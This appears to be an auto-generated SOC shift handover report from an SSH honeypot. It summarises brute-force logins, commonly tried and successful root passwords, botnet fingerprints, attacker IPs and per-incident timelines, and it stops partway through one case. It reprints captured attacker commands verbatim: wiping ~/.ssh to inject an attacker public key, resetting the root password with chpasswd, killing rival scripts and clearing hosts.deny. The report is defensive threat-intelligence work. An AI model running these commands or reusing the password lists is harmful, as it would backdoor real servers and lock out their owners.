# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-11 |
| **Generated At** | 2026-06-11T16:09:36Z |
| **Shift Time** | 16:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **285** |
| Confirmed Threats | **241** |
| False Positives Filtered | **44** (15.4%) |
| Unique Attacker IPs | **55** |
| Countries of Origin | **17** |
| High Severity Cases | **51** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **234** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **154** |
| Unique Credential Pairs | **110** |
| Unique Usernames | **78** |
| Unique Passwords | **90** |
| Successful Auth Pairs | **36** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 51 |
| `345gs5662d34` | 22 |
| `ubuntu` | 3 |
| `test` | 2 |
| `admin` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 22 |
| `3245gs5662d34` | 22 |
| `123456` | 15 |
| `password` | 3 |
| `@qwer2025` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 22 |
| `root` | `3245gs5662d34` | 22 |
| `root` | `@qwer2025` | 3 |
| `rainbow` | `123456` | 1 |
| `atlant` | `atlant` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `2wsxZAQ!` | `4.184.246.230` | 2026-06-11T10:43:20 |
| `root` | `3245gs5662d34` | `4.184.246.230` | 2026-06-11T10:43:23 |
| `root` | `@qwer2025` | `4.184.246.230` | 2026-06-11T10:48:04 |
| `root` | `admin@root` | `4.184.246.230` | 2026-06-11T10:50:36 |
| `root` | `Abc12345@` | `4.184.246.230` | 2026-06-11T10:56:58 |
| `root` | `pass123` | `4.184.246.230` | 2026-06-11T10:59:41 |
| `root` | `Test_123` | `4.184.246.230` | 2026-06-11T11:03:57 |
| `root` | `Qwerty@12345` | `4.184.246.230` | 2026-06-11T11:06:31 |
| `root` | `qwer1234!@` | `114.111.53.214` | 2026-06-11T11:36:35 |
| `root` | `3245gs5662d34` | `114.111.53.214` | 2026-06-11T11:36:39 |
| `root` | `www.4399.com` | `58.6.206.239` | 2026-06-11T12:39:35 |
| `root` | `3245gs5662d34` | `58.6.206.239` | 2026-06-11T12:39:49 |
| `root` | `Password01@` | `187.141.71.166` | 2026-06-11T12:46:40 |
| `root` | `3245gs5662d34` | `187.141.71.166` | 2026-06-11T12:46:46 |
| `root` | `Aa1357911` | `218.78.60.105` | 2026-06-11T13:30:33 |
| `root` | `MoeClub.org` | `218.78.60.105` | 2026-06-11T13:36:35 |
| `root` | `Aliyun@123` | `218.78.60.105` | 2026-06-11T13:41:06 |
| `root` | `root123456.` | `218.78.60.105` | 2026-06-11T13:50:04 |
| `root` | `Centos123` | `218.78.60.105` | 2026-06-11T13:55:48 |
| `root` | `@qwer2025` | `51.77.158.34` | 2026-06-11T14:15:01 |
| `root` | `3245gs5662d34` | `51.77.158.34` | 2026-06-11T14:15:04 |
| `root` | `Rx123456` | `103.20.122.54` | 2026-06-11T14:21:44 |
| `root` | `3245gs5662d34` | `103.20.122.54` | 2026-06-11T14:21:47 |
| `root` | `Master@2024` | `118.193.61.170` | 2026-06-11T14:28:26 |
| `root` | `3245gs5662d34` | `118.193.61.170` | 2026-06-11T14:28:30 |
| `root` | `admin2022.` | `103.20.122.54` | 2026-06-11T14:29:47 |
| `root` | `An123456` | `14.103.118.208` | 2026-06-11T14:37:54 |
| `root` | `asdfg12345` | `118.193.61.170` | 2026-06-11T14:38:05 |
| `root` | `1qazXSW@#EDC` | `118.193.61.170` | 2026-06-11T14:40:01 |
| `root` | `alireza` | `103.20.122.54` | 2026-06-11T14:43:32 |
| `root` | `!@#QWEqwe123` | `118.193.61.170` | 2026-06-11T14:43:55 |
| `root` | `123456zxc` | `118.193.61.170` | 2026-06-11T14:46:00 |
| `root` | `@qwer2025` | `118.193.61.170` | 2026-06-11T14:51:54 |
| `root` | `123456789.com` | `14.103.118.208` | 2026-06-11T14:53:14 |
| `root` | `Hello2024` | `118.193.61.170` | 2026-06-11T14:53:48 |
| `root` | `qa147258` | `103.20.122.54` | 2026-06-11T15:07:36 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **285** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 204 |
| OpenSSH | 3 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 160 | 13 |
| `03a80b21afa8...` | Modern SSH client | 38 | 4 |
| `acaa53e0a7d7...` | Mirai/variant | 3 | 3 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |
| `af8223ac9914...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 160 | 13 | Mirai/variant |
| `03a80b21afa8...` | libssh | 38 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 5 | — |
| `acaa53e0a7d7...` | OpenSSH | 3 | 3 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 22 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:7MmpLwhwBfNB"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.118.208`, `218.78.60.105`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `114.111.53.214`, `4.184.246.230`, `187.141.71.166`, `51.77.158.34`, `58.6.206.239`, `118.193.61.170`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **55** |
| Unique ASNs | **36** |
| High-Risk ASNs | **26** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 6 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS22773` | Cox Communications Inc. | 4 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | LOW |
| `AS0` |  | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (51)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fab1b645fccd

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 10:43 |
| **Last Seen** | 2026-06-11 10:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 10:43:19` | `cowrie.session.connect` |
| `2026-06-11 10:43:19` | `cowrie.client.version` |
| `2026-06-11 10:43:19` | `cowrie.client.kex` |
| `2026-06-11 10:43:20` | `cowrie.login.success` |
| `2026-06-11 10:43:20` | `cowrie.session.params` |
| `2026-06-11 10:43:20` | `cowrie.command.input` |
| `2026-06-11 10:43:20` | `cowrie.command.failed` |
| `2026-06-11 10:43:20` | `cowrie.log.closed` |
| `2026-06-11 10:43:20` | `cowrie.session.params` |
| `2026-06-11 10:43:20` | `cowrie.command.input` |
| `2026-06-11 10:43:21` | `cowrie.session.file_download` |
| `2026-06-11 10:43:21` | `cowrie.log.closed` |
| `2026-06-11 10:43:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-374440955df1

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 10:43 |
| **Last Seen** | 2026-06-11 10:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 10:43:23` | `cowrie.session.connect` |
| `2026-06-11 10:43:23` | `cowrie.client.version` |
| `2026-06-11 10:43:23` | `cowrie.client.kex` |
| `2026-06-11 10:43:23` | `cowrie.login.success` |
| `2026-06-11 10:43:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3c6f02aab1b

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 10:48 |
| **Last Seen** | 2026-06-11 10:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 10:48:03` | `cowrie.session.connect` |
| `2026-06-11 10:48:03` | `cowrie.client.version` |
| `2026-06-11 10:48:04` | `cowrie.client.kex` |
| `2026-06-11 10:48:04` | `cowrie.login.success` |
| `2026-06-11 10:48:04` | `cowrie.session.params` |
| `2026-06-11 10:48:04` | `cowrie.command.input` |
| `2026-06-11 10:48:04` | `cowrie.command.failed` |
| `2026-06-11 10:48:05` | `cowrie.log.closed` |
| `2026-06-11 10:48:05` | `cowrie.session.params` |
| `2026-06-11 10:48:05` | `cowrie.command.input` |
| `2026-06-11 10:48:05` | `cowrie.session.file_download` |
| `2026-06-11 10:48:05` | `cowrie.log.closed` |
| `2026-06-11 10:48:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0200d2399603

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 10:48 |
| **Last Seen** | 2026-06-11 10:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 10:48:07` | `cowrie.session.connect` |
| `2026-06-11 10:48:07` | `cowrie.client.version` |
| `2026-06-11 10:48:07` | `cowrie.client.kex` |
| `2026-06-11 10:48:08` | `cowrie.login.success` |
| `2026-06-11 10:48:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-942530a796c6

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 10:50 |
| **Last Seen** | 2026-06-11 10:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 10:50:35` | `cowrie.session.connect` |
| `2026-06-11 10:50:35` | `cowrie.client.version` |
| `2026-06-11 10:50:35` | `cowrie.client.kex` |
| `2026-06-11 10:50:36` | `cowrie.login.success` |
| `2026-06-11 10:50:36` | `cowrie.session.params` |
| `2026-06-11 10:50:36` | `cowrie.command.input` |
| `2026-06-11 10:50:36` | `cowrie.command.failed` |
| `2026-06-11 10:50:37` | `cowrie.log.closed` |
| `2026-06-11 10:50:37` | `cowrie.session.params` |
| `2026-06-11 10:50:37` | `cowrie.command.input` |
| `2026-06-11 10:50:37` | `cowrie.session.file_download` |
| `2026-06-11 10:50:37` | `cowrie.log.closed` |
| `2026-06-11 10:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47b1eb6ee08e

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 10:50 |
| **Last Seen** | 2026-06-11 10:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 10:50:39` | `cowrie.session.connect` |
| `2026-06-11 10:50:39` | `cowrie.client.version` |
| `2026-06-11 10:50:39` | `cowrie.client.kex` |
| `2026-06-11 10:50:40` | `cowrie.login.success` |
| `2026-06-11 10:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed292ca4d885

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 10:56 |
| **Last Seen** | 2026-06-11 10:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 10:56:57` | `cowrie.session.connect` |
| `2026-06-11 10:56:57` | `cowrie.client.version` |
| `2026-06-11 10:56:57` | `cowrie.client.kex` |
| `2026-06-11 10:56:58` | `cowrie.login.success` |
| `2026-06-11 10:56:58` | `cowrie.session.params` |
| `2026-06-11 10:56:58` | `cowrie.command.input` |
| `2026-06-11 10:56:58` | `cowrie.command.failed` |
| `2026-06-11 10:56:58` | `cowrie.log.closed` |
| `2026-06-11 10:56:59` | `cowrie.session.params` |
| `2026-06-11 10:56:59` | `cowrie.command.input` |
| `2026-06-11 10:56:59` | `cowrie.session.file_download` |
| `2026-06-11 10:56:59` | `cowrie.log.closed` |
| `2026-06-11 10:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65c40f8bd021

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 10:57 |
| **Last Seen** | 2026-06-11 10:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 10:57:01` | `cowrie.session.connect` |
| `2026-06-11 10:57:01` | `cowrie.client.version` |
| `2026-06-11 10:57:01` | `cowrie.client.kex` |
| `2026-06-11 10:57:02` | `cowrie.login.success` |
| `2026-06-11 10:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28b5ea65b5f7

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 10:59 |
| **Last Seen** | 2026-06-11 10:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 10:59:40` | `cowrie.session.connect` |
| `2026-06-11 10:59:40` | `cowrie.client.version` |
| `2026-06-11 10:59:40` | `cowrie.client.kex` |
| `2026-06-11 10:59:41` | `cowrie.login.success` |
| `2026-06-11 10:59:41` | `cowrie.session.params` |
| `2026-06-11 10:59:41` | `cowrie.command.input` |
| `2026-06-11 10:59:41` | `cowrie.command.failed` |
| `2026-06-11 10:59:41` | `cowrie.log.closed` |
| `2026-06-11 10:59:42` | `cowrie.session.params` |
| `2026-06-11 10:59:42` | `cowrie.command.input` |
| `2026-06-11 10:59:42` | `cowrie.session.file_download` |
| `2026-06-11 10:59:42` | `cowrie.log.closed` |
| `2026-06-11 10:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-079f46ec21f4

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 10:59 |
| **Last Seen** | 2026-06-11 10:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 10:59:44` | `cowrie.session.connect` |
| `2026-06-11 10:59:44` | `cowrie.client.version` |
| `2026-06-11 10:59:44` | `cowrie.client.kex` |
| `2026-06-11 10:59:44` | `cowrie.login.success` |
| `2026-06-11 10:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9ea23394487

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-06-11 11:03 |
| **Last Seen** | 2026-06-11 11:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 11:03:57` | `cowrie.session.connect` |
| `2026-06-11 11:03:57` | `cowrie.client.version` |
| `2026-06-11 11:03:57` | `cowrie.client.kex` |
| `2026-06-11 11:03:57` | `cowrie.login.success` |
| `2026-06-11 11:03:58` | `cowrie.session.params` |
| `2026-06-11 11:03:58` | `cowrie.command.input` |
| `2026-06-11 11:03:58` | `cowrie.command.failed` |
| `2026-06-11 11:03:58` | `cowrie.log.closed` |
| `2026-06-11 11:03:58` | `cowrie.session.params` |
| `2026-06-11 11:03:58` | `cowrie.command.input` |
| `2026-06-11 11:03:58` | `cowrie.session.file_download` |
| `2026-06-11 11:03:58` | `cowrie.log.closed` |
